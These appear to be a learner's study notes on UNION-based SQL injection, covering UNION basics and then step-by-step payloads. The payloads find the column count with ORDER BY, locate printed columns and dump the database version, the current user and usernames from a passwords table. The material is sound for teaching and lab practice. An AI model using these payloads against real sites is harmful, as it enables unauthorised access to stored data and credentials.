

```sql
SELECT * FROM ports;

SELECT * FROM ports;

SELECT * FROM ports UNION SELECT * FROM ships;

-- Note:
-- 1. Both of them should have the same number of columns
-- 2. Datatypes should be same of respective columns
-- 3. You may use NULL 
```


## Un-even Columns
```sql
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

OR WHY NOT

mysql> SELECT * from products where product_id UNION SELECT username, NULL, NULL, NULL from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

---
Example:

```sql
select * from employees union select null,null,dept_name,dept_no,null,null from departments;
```

---

### **Union Injection

- SQLi confirmed when injecting `'` produces a syntax error.
    
- **Goal:** Use `UNION` to append our own `SELECT` query to the original one.
    

#### **1. Find Number of Columns**

Two methods:

**ORDER BY method:**

- Inject: `' order by 1-- -` → works
    
- Increase until error.
    
- Error on `order by 5` ⇒ table has **4 columns**.
    

**UNION method:**

- `cn' UNION select 1,2,3-- -` → error (column mismatch)
    
- `cn' UNION select 1,2,3,4-- -` → works ⇒ **4 columns**.
    

#### **2. Find Printable Columns**

- Webpage may not display all columns.
    
- Inject: `cn' UNION select 1,2,3,4-- -`
    
- Output shows **2, 3, 4**, so columns **2–4 print**, column **1 hidden**.
    

#### **3. Inject Useful Data**

Replace one printed column with your payload.

Example:  
`cn' UNION select 1,@@version,3,4-- -`  
→ Dumps MariaDB version.

---
#### Example

Step 1:

```sql
cn' order by 1 -- -
```

![[Pasted image 20251130181643.png]]

Step2:
```sql
cn' union select null, user(), null, null -- -
```

![[Pasted image 20251130182146.png]]